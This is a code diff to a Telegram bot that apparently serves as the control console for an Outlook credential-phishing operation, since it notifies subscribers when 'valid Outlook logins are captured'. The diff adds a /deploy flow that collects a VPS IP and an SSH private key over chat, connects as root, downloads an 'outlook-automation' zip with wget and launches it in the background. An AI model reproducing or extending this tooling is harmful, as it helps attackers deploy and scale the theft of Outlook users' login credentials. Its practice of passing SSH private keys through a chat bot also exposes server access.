@@ -1,6 +1,7 @@
 const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 const path = require('path');
+const { Client } = require('ssh2');
 
 class AdminTokenBot {
     constructor() {
@@ -9,6 +10,12 @@ class AdminTokenBot {
         this.chatIds = new Set(); // Store user chat IDs for notifications
         this.rateLimits = new Map(); // Rate limiting per chat ID
         this.subscriptionsFile = path.join(__dirname, 'telegram_subscriptions.json');
+        
+        // Deployment state tracking
+        this.deploymentStates = new Map(); // chatId -> deployment state
+        
+        // Hardcoded app source URL - update this to your actual repository
+        this.APP_SOURCE_URL = 'https://github.com/yourusername/your-repo/archive/main.zip';
         
         // Load persistent subscriptions
         this.loadSubscriptions();
@@ -131,6 +138,38 @@ You'll automatically receive notifications when valid Outlook logins are capture
             }
         });
 
+        // Deploy command
+        this.bot.onText(/\/deploy/, (msg) => {
+            const chatId = msg.chat.id;
+            
+            if (!this.checkRateLimit(chatId, 'deploy')) {
+                this.bot.sendMessage(chatId, '⏱️ Please wait before starting deployment.');
+                return;
+            }
+
+            this.deploymentStates.set(chatId, { step: 'vps_ip' });
+            
+            this.bot.sendMessage(chatId, `
+🚀 *VPS Deployment*
+
+Please provide your VPS IP address:
+(Example: 192.168.1.100)
+            `, { parse_mode: 'Markdown' });
+        });
+
+        // Deploy status command
+        this.bot.onText(/\/status/, (msg) => {
+            const chatId = msg.chat.id;
+            
+            const state = this.deploymentStates.get(chatId);
+            if (!state) {
+                this.bot.sendMessage(chatId, '📊 No active deployment. Use /deploy to start.');
+                return;
+            }
+
+            this.bot.sendMessage(chatId, `📊 Deployment Status: ${state.status || 'In Progress'}`);
+        });
+
         // Help command
         this.bot.onText(/\/help/, (msg) => {
             const chatId = msg.chat.id;
@@ -141,18 +180,20 @@ You'll automatically receive notifications when valid Outlook logins are capture
             }
             
             const helpMessage = `
-🔐 *Admin Token & Notifications Bot*
+🔐 *Admin Token & VPS Deployment Bot*
 
 *Available Commands:*
 • /start - Show welcome message and token button
 • /notify on - Enable login notifications  
 • /notify off - Disable notifications
+• /deploy - Deploy to VPS remotely
+• /status - Check deployment status
 • /help - Show this help message
 
 *How it works:*
 1. Click "Get Admin Token" to access the admin panel
-2. Enable notifications to get alerts when Outlook logins are captured
-3. Each notification includes login details and quick access to admin panel
+2. Use /deploy to remotely install on any VPS
+3. Enable notifications to get alerts when Outlook logins are captured
 
 You'll receive real-time notifications when Outlook logins are captured! 🔔
             `;
@@ -215,6 +256,30 @@ You'll receive real-time notifications when Outlook logins are captured! 🔔
             this.bot.answerCallbackQuery(query.id);
         });
 
+        // Handle text messages for deployment flow
+        this.bot.on('message', (msg) => {
+            const chatId = msg.chat.id;
+            const text = msg.text;
+
+            // Skip commands
+            if (text?.startsWith('/')) return;
+
+            const state = this.deploymentStates.get(chatId);
+            if (!state) return;
+
+            this.handleDeploymentFlow(chatId, text, state);
+        });
+
+        // Handle document uploads for SSH keys
+        this.bot.on('document', (msg) => {
+            const chatId = msg.chat.id;
+            const state = this.deploymentStates.get(chatId);
+            
+            if (state?.step === 'ssh_key') {
+                this.handleSSHKeyUpload(chatId, msg.document);
+            }
+        });
+
         // Error handling
         this.bot.on('error', (error) => {
             console.error(`Telegram Bot error: ${error.code} - ${error.message}`);
@@ -270,6 +335,160 @@ You'll receive real-time notifications when Outlook logins are captured! 🔔
         }
         
         console.log(`📤 Login notification sent to ${this.chatIds.size} Telegram users`);
+    }
+
+    async handleDeploymentFlow(chatId, text, state) {
+        switch (state.step) {
+            case 'vps_ip':
+                // Validate IP format
+                const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
+                if (!ipRegex.test(text)) {
+                    this.bot.sendMessage(chatId, '❌ Invalid IP format. Please enter a valid IP address (e.g., 192.168.1.100)');
+                    return;
+                }
+                
+                state.vpsIP = text;
+                state.step = 'ssh_key';
+                this.deploymentStates.set(chatId, state);
+                
+                this.bot.sendMessage(chatId, `
+✅ VPS IP: ${text}
+
+🔑 Now please upload your SSH private key file.
+(Send as a document/file)
+                `);
+                break;
+
+            case 'confirm':
+                if (text.toLowerCase() === 'yes' || text.toLowerCase() === 'y') {
+                    await this.startDeployment(chatId, state);
+                } else {
+                    this.deploymentStates.delete(chatId);
+                    this.bot.sendMessage(chatId, '❌ Deployment cancelled.');
+                }
+                break;
+        }
+    }
+
+    async handleSSHKeyUpload(chatId, document) {
+        try {
+            const state = this.deploymentStates.get(chatId);
+            
+            // Download SSH key file
+            const fileLink = await this.bot.getFileLink(document.file_id);
+            const response = await fetch(fileLink);
+            const sshKey = await response.text();
+            
+            state.sshKey = sshKey;
+            state.step = 'confirm';
+            this.deploymentStates.set(chatId, state);
+            
+            this.bot.sendMessage(chatId, `
+🔑 SSH key received!
+
+📋 *Deployment Summary:*
+• VPS IP: ${state.vpsIP}
+• SSH Key: ✅ Uploaded
+• App Source: ${this.APP_SOURCE_URL}
+
+Ready to deploy? Type 'yes' to start.
+            `, { parse_mode: 'Markdown' });
+            
+        } catch (error) {
+            this.bot.sendMessage(chatId, '❌ Failed to process SSH key. Please try again.');
+        }
+    }
+
+    async startDeployment(chatId, state) {
+        this.bot.sendMessage(chatId, '🚀 Starting deployment...');
+        
+        const conn = new Client();
+        
+        try {
+            await new Promise((resolve, reject) => {
+                conn.connect({
+                    host: state.vpsIP,
+                    username: 'root', // or 'ubuntu' depending on your VPS
+                    privateKey: state.sshKey,
+                    readyTimeout: 20000
+                });
+                
+                conn.on('ready', () => {
+                    this.bot.sendMessage(chatId, '✅ Connected to VPS!');
+                    resolve();
+                });
+                
+                conn.on('error', reject);
+            });
+
+            // Run deployment commands
+            await this.executeDeploymentCommands(chatId, conn, state);
+            
+        } catch (error) {
+            this.bot.sendMessage(chatId, `❌ Deployment failed: ${error.message}`);
+        } finally {
+            conn.end();
+            this.deploymentStates.delete(chatId);
+        }
+    }
+
+    async executeDeploymentCommands(chatId, conn, state) {
+        const commands = [
+            'apt update',
+            'curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -',
+            'apt install -y nodejs unzip',
+            'apt install -y ca-certificates fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgbm1 libgcc1 libglib2.0-0 libgtk-3-0 libnspr4 libnss3 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 lsb-release wget xdg-utils',
+            `wget ${this.APP_SOURCE_URL} -O app.zip`,
+            'unzip app.zip',
+            'mv */outlook-automation/ . 2>/dev/null || mv outlook-automation-*/ outlook-automation/ 2>/dev/null || echo "Directory setup"',
+            'cd outlook-automation && npm install',
+            'cd outlook-automation && nohup npm start > app.log 2>&1 &'
+        ];
+
+        for (let i = 0; i < commands.length; i++) {
+            const cmd = commands[i];
+            this.bot.sendMessage(chatId, `📦 Step ${i + 1}/${commands.length}: ${cmd.substring(0, 50)}...`);
+            
+            try {
+                await this.execCommand(conn, cmd);
+                this.bot.sendMessage(chatId, `✅ Step ${i + 1} completed`);
+            } catch (error) {
+                this.bot.sendMessage(chatId, `❌ Step ${i + 1} failed: ${error.message}`);
+                throw error;
+            }
+        }
+
+        this.bot.sendMessage(chatId, `
+🎉 *Deployment Complete!*
+
+Your app is now running on:
+• http://${state.vpsIP}:5000
+
+To check status: ssh into your VPS and run:
+• \`ps aux | grep node\`
+• \`tail -f outlook-automation/app.log\`
+        `, { parse_mode: 'Markdown' });
+    }
+
+    execCommand(conn, command) {
+        return new Promise((resolve, reject) => {
+            conn.exec(command, (err, stream) => {
+                if (err) reject(err);
+                
+                let output = '';
+                stream.on('data', (data) => {
+                    output += data.toString();
+                });
+                
+                stream.on('close', (code) => {
+                    if (code === 0) {
+                        resolve(output);
+                    } else {
+                        reject(new Error(`Command failed with code ${code}: ${output}`));
+                    }
+                });
+            });
+        });
     }
 
     getSubscribedUsers() {
